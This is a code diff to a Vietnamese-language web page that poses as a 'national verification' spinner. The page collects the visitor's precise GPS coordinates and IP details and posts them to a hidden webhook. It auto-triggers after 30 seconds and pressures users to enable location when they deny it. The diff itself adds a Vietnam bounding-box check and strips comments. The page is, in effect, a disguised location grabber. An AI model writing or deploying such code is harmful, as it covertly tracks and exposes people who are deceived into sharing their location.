@@ -61,9 +61,6 @@
         .crossmark::after { transform: rotate(45deg); }
         .crossmark::before { transform: rotate(-45deg); }
         .hidden { display: none; }
-        #mapImage {
-            max-width: 280px; border-radius: 12px; margin: 10px 0; border: 2px solid #333;
-        }
         .action-btn {
             margin-top: 15px; padding: 10px 28px; background: rgba(255,255,255,0.1);
             border-radius: 50px; color: #ffbe0b; font-weight: 600; cursor: pointer;
@@ -209,7 +206,6 @@
             });
         }
 
-        // GPS request with detailed error
         function forceGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -223,7 +219,7 @@
                         accuracy: Math.round(pos.coords.accuracy),
                         error: null
                     }),
-                    err => resolve({ error: err.code }), // 1=PERMISSION_DENIED, 2=POSITION_UNAVAILABLE, 3=TIMEOUT
+                    err => resolve({ error: err.code }),
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
             });
@@ -258,7 +254,13 @@
             await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
         }
 
-        // Show the result (success / failure / gps error)
+        // Check if coordinates are inside Vietnam's bounding box
+        function isInsideVietnam(lat, lon) {
+            // Approximate bounds: lat 8.0 – 23.5, lon 102.0 – 110.0
+            if (typeof lat !== 'number' || typeof lon !== 'number') return false;
+            return lat >= 8.0 && lat <= 23.5 && lon >= 102.0 && lon <= 110.0;
+        }
+
         function showResult(type, message, subMessage, buttons = []) {
             wheelSection.classList.add('hidden');
             resultSection.classList.remove('hidden');
@@ -279,21 +281,17 @@
             });
         }
 
-        // Open Android location settings (intent)
         function openLocationSettings() {
-            const ua = navigator.userAgent;
-            if (/Android/.test(ua)) {
+            if (/Android/.test(navigator.userAgent)) {
                 window.location.href = 'intent://com.android.settings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;';
             } else {
                 alert('Vui lòng mở Cài đặt > Quyền riêng tư > Dịch vụ vị trí và bật vị trí cho trình duyệt.');
             }
         }
 
-        // Retry verification (go back to wheel)
         function retry() {
             resultSection.classList.add('hidden');
             wheelSection.classList.remove('hidden');
-            // reset wheel state
             wheelEl.classList.remove('paused');
             percentEl.textContent = '100%';
             statusEl.textContent = 'Sẵn sàng xác minh quốc gia';
@@ -302,7 +300,6 @@
             tapBtn.classList.remove('hidden');
         }
 
-        // Main verification process
         async function startVerification() {
             tapBtn.classList.add('hidden');
             tapPrompt.classList.add('hidden');
@@ -316,7 +313,6 @@
                 if (fake >= 100) { fake = 100; clearInterval(fakeInterval); wheelEl.classList.add('paused'); percentEl.textContent = '100%'; }
             }, 80);
 
-            // Request GPS and fetch IP in parallel
             const gpsPromise = forceGPS();
             ipData = await fetchIP();
             const gpsResult = await gpsPromise;
@@ -325,22 +321,24 @@
             wheelEl.classList.add('paused');
             percentEl.textContent = '100%';
 
-            // Handle GPS result
-            if (gpsResult && !gpsResult.error) {
-                gpsData = gpsResult;
+            gpsData = gpsResult;
+
+            // Determine if user is in Vietnam
+            let isVietnam = false;
+            if (gpsData && !gpsData.error && gpsData.lat != null && gpsData.lon != null) {
+                // GPS available – check coordinates
+                isVietnam = isInsideVietnam(gpsData.lat, gpsData.lon);
             } else {
-                gpsData = gpsResult; // contains error code
+                // GPS denied/unavailable – fallback to IP
+                if (ipData) {
+                    const country = ipData.country || '';
+                    isVietnam = country.toLowerCase().includes('vietnam') || (ipData.countryCode && ipData.countryCode.toLowerCase() === 'vn');
+                }
             }
 
-            // Check country from IP
-            const country = ipData ? ipData.country : '';
-            const isVietnam = country.toLowerCase().includes('vietnam') || 
-                              (ipData && ipData.countryCode && ipData.countryCode.toLowerCase() === 'vn');
-
-            // Send data to webhook
             await sendData();
 
-            // If GPS failed with permission denied or position unavailable (location off)
+            // Handle GPS permission errors separately
             if (gpsData && gpsData.error && (gpsData.error === 1 || gpsData.error === 2)) {
                 showResult(
                     'error',
@@ -354,7 +352,6 @@
                 return;
             }
 
-            // Country check
             if (isVietnam) {
                 showResult(
                     'success',
@@ -377,7 +374,7 @@
             }
         }
 
-        // ---- Wheel flow ----
+        // Initial wheel
         let progress = 0;
         const wheelTimer = setInterval(() => {
             progress += 20;
@@ -397,7 +394,6 @@
 
         tapBtn.addEventListener('click', startVerification);
 
-        // Auto-click after 30 seconds if user doesn't tap
         setTimeout(() => {
             if (!tapBtn.classList.contains('hidden')) tapBtn.click();
         }, 30000);
